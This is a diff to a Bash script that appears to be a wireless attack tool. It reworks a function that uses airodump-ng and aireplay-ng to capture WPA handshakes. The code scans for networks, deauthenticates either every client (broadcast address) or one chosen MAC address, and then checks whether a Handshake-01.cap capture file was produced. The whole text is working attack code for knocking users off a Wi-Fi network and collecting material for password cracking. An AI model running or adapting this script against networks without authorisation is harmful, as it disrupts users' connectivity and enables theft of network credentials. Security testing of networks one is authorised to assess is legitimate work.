@@ -157,33 +157,7 @@ updatepackages() {
 	fi
 
 }
-
-handshake_ataque() {
-	clear
-	echo -e "\n${turquoiseColour}[*]$grayColour Starting Handshake attack"
-	sleep 1
- 	tput cnorm
-	xterm -hold -e "airodump-ng ${tar}" &
-	xtermnet=$!
-	echo -ne "\n${greenColour}[?]$grayColour Select a network (Essid): " && read ap
-	echo -ne "${greenColour}[?]$grayColour What channel is ${ap}?: " && read channel
-	tput civis
-	$cleancolor
-	echo -e "${greenColour}[*]$grayColour Network users are being deauthenticated"
-	$cleancolor
-	kill -9 $xtermnet; wait $xtermnet 2>/dev/null
-	xterm -hold -e "airodump-ng -c $channel -w Handshake --essid $ap $tar" &
-	airodump_filter_xterm_PID=$!
-
-	sleep 2; xterm -hold -e "aireplay-ng -0 10 -e $ap -c FF:FF:FF:FF:FF:FF $tar" &
-	aireplay_xterm_PID=$!
-	sleep 10; kill -9 $aireplay_xterm_PID; wait $aireplay_xterm_PID 2>/dev/null
-
-	echo -e "${redColour}\n[%]$grayColour Waiting for Handshake\n"
-	$cleancolor
-								
-	sleep 10; kill -9 $airodump_filter_xterm_PID
-	wait $airodump_filter_xterm_PID 2>/dev/null
+testhandshake() {
 	test -f Handshake-01.cap
 	if [ "$(echo $?)" == "0" ]; then
 		tput cnorm
@@ -202,6 +176,51 @@ handshake_ataque() {
 	else 
 		echo -e "${redColour}\n[!]$grayColour Handshake has not been captured"
 		sleep 2
+	fi
+}
+
+handshake_ataque() {
+	clear
+	echo -e "\n${turquoiseColour}[*]$grayColour Starting Handshake attack"
+	sleep 1
+ 	tput cnorm
+	xterm -hold -e "airodump-ng ${tar}" &
+	xtermnet=$!
+	echo -ne "\n${greenColour}[?]$grayColour Select a network (Essid): " && read ap
+	echo -ne "${greenColour}[?]$grayColour What channel is ${ap}?: " && read channel
+	tput civis
+	$cleancolor; kill -9 $xtermnet; wait $xtermnet 2>/dev/null
+	echo -e "${greenColour}[!]$grayColour If you choose no, a global deauthentication will be performed on the network"
+	echo -ne "${greenColour}[?]$grayColour Do you want to add a MAC address for deauthentication?  [Y/N]: " && read macoption
+	if [ "$macoption" == "Y" ] || [ "$macoption" == "y" ]; then
+		echo -ne "\n${blueColour}[?]$grayColour MAC: " && read macdes
+		echo -e "${greenColour}[*]$grayColour $macdes is deauthenticating"
+		xterm -hold -e "airodump-ng -c $channel -w Handshake --essid $ap $tar" &
+		airodump_filter_xtermMAC_PID=$!
+		sleep 2; xterm -hold -e "aireplay-ng -0 10 -e $ap -c $macdes $tar" &
+		aireplay_xtermMAC_PID=$!
+		sleep 10; kill -9 $aireplay_xtermMAC_PID; wait $aireplay_xtermMAC_PID 2>/dev/null
+		echo -e "${redColour}\n[%]$grayColour Waiting for Handshake\n"
+		$cleancolor
+		sleep 10; kill -9 $airodump_filter_xtermMAC_PID
+		wait $airodump_filter_xtermMAC_PID 2>/dev/null
+		testhandshake
+	elif [ "$macoption" == "n" ] || [ "$macoption" == "N" ]; then
+		echo -e "${greenColour}[*]$grayColour Network users are being deauthenticated"
+		$cleancolor
+		xterm -hold -e "airodump-ng -c $channel -w Handshake --essid $ap $tar" &
+		airodump_filter_xterm_PID=$!
+
+		sleep 2; xterm -hold -e "aireplay-ng -0 10 -e $ap -c FF:FF:FF:FF:FF:FF $tar" &
+		aireplay_xterm_PID=$!
+		sleep 10; kill -9 $aireplay_xterm_PID; wait $aireplay_xterm_PID 2>/dev/null
+
+		echo -e "${redColour}\n[%]$grayColour Waiting for Handshake\n"
+		$cleancolor
+									
+		sleep 10; kill -9 $airodump_filter_xterm_PID
+		wait $airodump_filter_xterm_PID 2>/dev/null
+		testhandshake
 	fi
 }
 # salida
